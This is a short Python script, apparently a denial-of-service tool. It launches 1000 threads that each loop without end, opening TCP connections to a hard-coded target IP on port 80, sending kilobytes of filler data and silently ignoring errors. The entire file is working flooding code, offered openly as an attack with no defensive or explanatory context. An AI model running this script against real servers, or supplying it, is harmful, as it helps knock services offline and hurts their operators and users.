import socket
import threading
import random

# Target server IP and port
target_ip = '192.168.1.100'
target_port = 80

# Number of connections to make
num_connections = 1000

# Function to send random data to the target server
def attack():
    while True:
        try:
            # Create a socket object
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to the target server
            sock.connect((target_ip, target_port))
            
            # Send random data to the server
            data = 'a' * random.randint(1024, 4096)
            sock.send(data.encode())
            
            # Close the socket
            sock.close()
            
        except:
            pass

# Create multiple threads to simulate multiple connections
for i in range(num_connections):
    thread = threading.Thread(target=attack)
    thread.start()